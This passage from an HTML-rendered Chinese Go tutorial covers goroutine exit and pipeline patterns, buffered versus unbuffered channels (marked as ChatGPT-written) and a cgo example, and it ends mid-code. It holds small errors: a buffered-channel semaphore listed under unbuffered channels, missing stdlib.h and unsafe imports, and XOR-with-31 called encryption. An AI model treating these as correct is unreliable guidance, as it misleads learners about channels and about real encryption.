punctuation\">)</span>\n    \n    <span class=\"token comment\">// 通知新创建的goroutine退出</span>\n    <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"notify the worker to exit...\"</span><span class=\"token punctuation\">)</span>\n    quit <span class=\"token operator\">&lt;-</span> <span class=\"token string\">\"exit\"</span>\n    \n    timer <span class=\"token operator\">:=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">NewTimer</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>Second <span class=\"token operator\">*</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">defer</span> timer<span class=\"token punctuation\">.</span><span class=\"token function\">Stop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">select</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">case</span> status <span class=\"token operator\">:=</span> <span class=\"token operator\">&lt;-</span>quit<span class=\"token punctuation\">:</span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"worker done:\"</span><span class=\"token punctuation\">,</span> status<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">case</span> <span class=\"token operator\">&lt;-</span>timer<span class=\"token punctuation\">.</span>C<span class=\"token punctuation\">:</span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"wait worker exit timeout\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>在上述示例代码中，使用创建模式创建goroutine的spawn函数返回的channel的作用发生了变化，从原先的只是用于新goroutine发送退出信号给创建者，变成了一个双向的数据通道：既承载创建者发送给新goroutine的退出信号，也承载新goroutine返回给创建者的退出状态。</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code><span class=\"token variable\">$go</span> run go-concurrency-pattern-5.go \nspawn a worker goroutine\nnotify the worker to exit<span class=\"token punctuation\">..</span>.\nworker done: ok\n</code></pre></div><p>② 通知并等待多个goroutine退出</p>\n<p>Go语言的channel有一个特性是，当使用close函数关闭channel时，所有阻塞到该channel上的goroutine都会得到通知。我们就利用这一特性实现满足这一场景的模式：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token comment\">// chapter6/sources/go-concurrency-pattern-6.go</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">worker</span><span class=\"token punctuation\">(</span>j <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    time<span class=\"token punctuation\">.</span><span class=\"token function\">Sleep</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>Second <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span><span class=\"token function\">Duration</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">spawnGroup</span><span class=\"token punctuation\">(</span>n <span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> f <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">chan</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span> <span class=\"token punctuation\">{</span>\n    quit <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n    job <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">var</span> wg sync<span class=\"token punctuation\">.</span>WaitGroup\n    \n    <span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> n<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n        wg<span class=\"token punctuation\">.</span><span class=\"token function\">Add</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>i <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">defer</span> wg<span class=\"token punctuation\">.</span><span class=\"token function\">Done</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 保证wg.Done在goroutine退出前被执行</span>\n            name <span class=\"token operator\">:=</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"worker-%d:\"</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">{</span>\n                j<span class=\"token punctuation\">,</span> ok <span class=\"token operator\">:=</span> <span class=\"token operator\">&lt;-</span>job\n                <span class=\"token keyword\">if</span> <span class=\"token operator\">!</span>ok <span class=\"token punctuation\">{</span>\n                    <span class=\"token function\">println</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> <span class=\"token string\">\"done\"</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">return</span>\n                <span class=\"token punctuation\">}</span>\n                <span class=\"token comment\">// 执行这个job</span>\n                <span class=\"token function\">worker</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token operator\">&lt;-</span>quit\n        <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>job<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 广播给所有新goroutine</span>\n        wg<span class=\"token punctuation\">.</span><span class=\"token function\">Wait</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        quit <span class=\"token operator\">&lt;-</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \n    <span class=\"token keyword\">return</span> quit\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    quit <span class=\"token operator\">:=</span> <span class=\"token function\">spawnGroup</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> worker<span class=\"token punctuation\">)</span>\n    <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"spawn a group of workers\"</span><span class=\"token punctuation\">)</span>\n    \n    time<span class=\"token punctuation\">.</span><span class=\"token function\">Sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span> <span class=\"token operator\">*</span> time<span class=\"token punctuation\">.</span>Second<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// 通知 worker goroutine 组退出</span>\n    <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"notify the worker group to exit...\"</span><span class=\"token punctuation\">)</span>\n    quit <span class=\"token operator\">&lt;-</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n    \n    timer <span class=\"token operator\">:=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">NewTimer</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>Second <span class=\"token operator\">*</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">defer</span> timer<span class=\"token punctuation\">.</span><span class=\"token function\">Stop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">select</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">case</span> <span class=\"token operator\">&lt;-</span>timer<span class=\"token punctuation\">.</span>C<span class=\"token punctuation\">:</span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"wait group workers exit timeout!\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">case</span> <span class=\"token operator\">&lt;-</span>quit<span class=\"token punctuation\">:</span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"group workers done\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>此时各个worker goroutine监听job channel，当创建者关闭job channel时，通过“comma ok”模式获取的ok值为false，也就表明该channel已经被关闭，于是worker goroutine执行退出逻辑（退出前<code>wg.Done()</code>被执行）。</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code><span class=\"token variable\">$go</span> run go-concurrency-pattern-6.go\nspawn a group of workers\nnotify the worker group to exit<span class=\"token punctuation\">..</span>.\nworker-3: <span class=\"token keyword\">done</span>\nworker-0: <span class=\"token keyword\">done</span>\nworker-4: <span class=\"token keyword\">done</span>\nworker-2: <span class=\"token keyword\">done</span>\nworker-1: <span class=\"token keyword\">done</span>\ngroup workers <span class=\"token keyword\">done</span>\n</code></pre></div><h3>管道模式</h3>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token comment\">// chapter6/sources/go-concurrency-pattern-8.go</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">newNumGenerator</span><span class=\"token punctuation\">(</span>start<span class=\"token punctuation\">,</span> count <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;-</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">{</span>\n    c <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> start<span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> start<span class=\"token operator\">+</span>count<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n            c <span class=\"token operator\">&lt;-</span> i\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> c\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">filterOdd</span><span class=\"token punctuation\">(</span>in <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> in<span class=\"token operator\">%</span><span class=\"token number\">2</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">return</span> in<span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">square</span><span class=\"token punctuation\">(</span>in <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> in <span class=\"token operator\">*</span> in<span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">spawn</span><span class=\"token punctuation\">(</span>f <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> in <span class=\"token operator\">&lt;-</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;-</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">{</span>\n    out <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span>\n    \n    <span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">for</span> v <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> in <span class=\"token punctuation\">{</span>\n            r<span class=\"token punctuation\">,</span> ok <span class=\"token operator\">:=</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> ok <span class=\"token punctuation\">{</span>\n                out <span class=\"token operator\">&lt;-</span> r\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>out<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \n    <span class=\"token keyword\">return</span> out\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    in <span class=\"token operator\">:=</span> <span class=\"token function\">newNumGenerator</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">)</span>\n    out <span class=\"token operator\">:=</span> <span class=\"token function\">spawn</span><span class=\"token punctuation\">(</span>square<span class=\"token punctuation\">,</span> <span class=\"token function\">spawn</span><span class=\"token punctuation\">(</span>filterOdd<span class=\"token punctuation\">,</span> in<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    \n    <span class=\"token keyword\">for</span> v <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> out <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h2>1.8. 有缓和无缓channel</h2>\n<blockquote>\n<p>这里全部来自chatGPT</p>\n</blockquote>\n<h3>特点</h3>\n<p>在Go语言中，channel（通道）是用于在 Go 协程之间进行通信和同步的重要机制。Channel 可以是有缓冲的（buffered）或无缓冲的（unbuffered），它们有不同的特性和适用场景。</p>\n<p>无缓冲 channel：</p>\n<ul>\n<li>无缓冲 channel 在发送数据和接收数据时是同步的，发送操作和接收操作是阻塞的。</li>\n<li>当一个数据被发送到无缓冲 channel 时，发送方会阻塞直到有其他 Go 协程从该 channel 接收数据。</li>\n<li>同样，当数据被接收时，接收方会阻塞直到有其他 Go 协程向 channel 发送数据。</li>\n</ul>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>ch <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 创建一个无缓冲 channel</span>\n</code></pre></div><p>有缓冲 channel：</p>\n<ul>\n<li>有缓冲 channel 具有一定的容量，允许在 channel 中存储一定数量的数据项。</li>\n<li>当往一个有缓冲 channel 发送数据时，如果 channel 还未满，发送操作是非阻塞的；当 channel 满时发送操作会阻塞。</li>\n<li>同样，当从一个有缓冲 channel 接收数据时，如果 channel 中有数据，接收操作是非阻塞的；当 channel 空时接收操作会阻塞。</li>\n</ul>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>ch <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 创建一个容量为 5 的有缓冲 channel</span>\n</code></pre></div><h3>使用场景</h3>\n<p><strong>无缓冲 channel ：</strong></p>\n<ol>\n<li>\n<p>同步数据传递：在两个 Go 协程之间进行数据传递，确保数据的顺序性和同步性。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>ch <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    data <span class=\"token operator\">:=</span> <span class=\"token number\">42</span>\n    ch <span class=\"token operator\">&lt;-</span> data <span class=\"token comment\">// 将数据发送到无缓冲 channel</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nresult <span class=\"token operator\">:=</span> <span class=\"token operator\">&lt;-</span>ch <span class=\"token comment\">// 接收从 channel 发来的数据</span>\n</code></pre></div></li>\n<li>\n<p>信号量：控制并发操作的数量，确保在特定时刻只有有限数量的并发操作在执行。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>sem <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 限制同时执行的并发操作数量为 5</span>\n<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>id <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        sem <span class=\"token operator\">&lt;-</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span> <span class=\"token comment\">// 获取信号量</span>\n        <span class=\"token keyword\">defer</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token operator\">&lt;-</span>sem <span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 释放信号量</span>\n        <span class=\"token comment\">// 执行并发操作</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div></li>\n</ol>\n<p><strong>有缓冲 channel ：</strong></p>\n<ol>\n<li>\n<p>生产者-消费者模型：用于在生产者和消费者之间进行解耦，提高程序的吞吐量。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>ch <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 有缓冲 channel，缓冲区大小为 10</span>\n<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n        ch <span class=\"token operator\">&lt;-</span> i <span class=\"token comment\">// 生产数据</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>ch<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">for</span> item <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> ch <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// 消费数据</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre></div></li>\n<li>\n<p><strong>异步结果处理</strong>：用于异步处理任务的结果，减少因为发送或接收操作阻塞而导致的性能问题。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>resultCh <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 有缓冲 channel，用于接收异步操作的结果</span>\n<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// 异步操作</span>\n    resultCh <span class=\"token operator\">&lt;-</span> <span class=\"token number\">42</span> <span class=\"token comment\">// 发送结果到 channel</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nresult <span class=\"token operator\">:=</span> <span class=\"token operator\">&lt;-</span>resultCh <span class=\"token comment\">// 接收异步操作的结果</span>\n</code></pre></div></li>\n</ol>\n<p>这些场景只是使用无缓冲和有缓冲 channel 的一部分示例。根据具体的需求，合理选择适当类型的 channel 可以提高程序的效率和可维护性，同时确保并发操作的正确性。</p>\n<h2>1.9. cgo-Go调用C代码</h2>\n<p>在 Go 语言中，CGO 是 Go 语言提供的一种特性，用于在 Go 代码中调用 C 语言代码。通过 CGO，可以很方便地在 Go 代码中集成现有的 C 代码库，或者利用 C 语言的性能优势来编写高性能的代码片段。</p>\n<p>使用 CGO 的一般流程包括以下步骤：</p>\n<ol>\n<li><strong>编写 C 代码</strong>：首先需要编写需要调用的 C 代码，可以是一个简单的 C 函数或者一个 C 语言库。</li>\n<li><strong>创建 C 头文件</strong>：为了在 Go 代码中调用 C 函数，需要创建一个 C 头文件，用于声明 C 函数的原型。</li>\n<li><strong>在 Go 代码中使用 CGO</strong>：在 Go 代码中通过 <code>import \"C\"</code> 来引入 CGO，然后通过 <code>// #cgo</code> 指令告诉编译器去链接 C 代码。</li>\n<li><strong>调用 C 函数</strong>：在 Go 代码中就可以像调用普通 Go 函数一样调用 C 函数，通过 CGO 技术实现 Go 与 C 语言的互操作。</li>\n</ol>\n<p>以下是一个更详细的示例，展示如何使用 CGO 在 Go 中调用一个简单的 C 函数来实现字符串加密和解密功能。</p>\n<p><strong>1. 编写 C 代码</strong></p>\n<p>首先，我们编写两个简单的 C 函数，一个用于加密字符串，另一个用于解密字符串。</p>\n<div class=\"language-c\" data-ext=\"c\" data-title=\"c\"><pre class=\"language-c\"><code><span class=\"token comment\">// encrypt.c</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h&gt;</span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span> str<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>str<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token operator\">*</span>str <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>str <span class=\"token operator\">^</span> <span class=\"token number\">31</span><span class=\"token punctuation\">;</span>\n        str<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// decrypt.c</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h&gt;</span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span> str<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>str<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token operator\">*</span>str <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>str <span class=\"token operator\">^</span> <span class=\"token number\">31</span><span class=\"token punctuation\">;</span>\n        str<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p><strong>2. 创建 C 头文件 <code>crypto.h</code></strong></p>\n<p>创建一个头文件 <code>crypto.h</code>，用于声明 C 函数的原型。</p>\n<div class=\"language-c\" data-ext=\"c\" data-title=\"c\"><pre class=\"language-c\"><code><span class=\"token comment\">// crypto.h</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span> str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span> str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p><strong>3. 编写 Go 代码</strong></p>\n<p>接下来，我们编写 Go 代码，通过 CGO 调用上述的 C 函数来加密和解密字符串。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">package</span> main\n\n<span class=\"token comment\">/*\n#cgo CFLAGS: -g -Wall\n#cgo LDFLAGS: -lm\n#include \"crypto.h\"\n*/</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"C\"</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"fmt\"</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    message <span class=\"token operator\">:=</span> <span class=\"token string\">\"Hello, world!\"</span>\n\n    <span class=\"token comment\">// Encrypt the message</span>\n    cMessage <span class=\"token operator\">:=</span> C<span class=\"token punctuation\">.</span><span class=\"token function\">CString</span><span class=\"token punctuation\">(</span>message<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">defer</span> C<span class=\"token punctuation\">.</span><span class=\"token function\">free</span><span class=\"token punctuation\">(</span>unsafe<span class=\"token punctuation\">.</span><span class=\"token function\">Pointer</span><span class=\"token punctuation\">(</span>cMessage<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    C<span class=\"token punctuation\">.</span><span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span>cMessage<span class=\"token punctuation\">)</span>\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Encrypted message: %s\\n\"</span><span class=\"token punctuation\">,</span> C<span class=\"token punctuation\">.</span><span class=\"token function\">GoString</span><span class=\"token 